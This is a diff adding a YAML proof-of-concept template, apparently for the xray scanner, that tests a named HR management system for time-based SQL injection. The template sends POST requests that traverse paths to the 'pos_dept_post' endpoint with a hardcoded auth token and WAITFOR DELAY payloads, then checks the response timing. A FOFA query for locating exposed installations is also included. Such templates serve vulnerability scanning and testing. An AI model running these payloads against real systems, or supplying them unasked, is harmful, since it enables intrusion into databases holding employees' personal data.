@@ -1,0 +1,32 @@
+name: poc-yaml-hjeHR-pos_dept_post-sql-injection
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /templates/attestation/../../pos/roleinfo/pos_dept_post
+      headers:
+        x-auth-token: d9eaeacd5de1008fd43f737c853dcbcb
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+      body: usertable=h00&i9999=1';WAITFOR DELAY '0:0:3'--+
+    expression: response.status == 200 && response.latency >= 3000 && response.latency <= 4000
+  r1:
+    request:
+      method: POST
+      path: /templates/attestation/../../pos/roleinfo/pos_dept_post
+      headers:
+        x-auth-token: d9eaeacd5de1008fd43f737c853dcbcb
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+      body: usertable=h00&i9999=1';WAITFOR DELAY '0:0:6'--+
+    expression: response.status == 200 && response.latency >= 6000 && response.latency <= 7000
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/139578445
+
+# fofa: body="<div class=\"hj-hy-all-one-logo\"" || title="人力资源信息管理系统" || body="/general/sys/hjaxmanage.js"
+
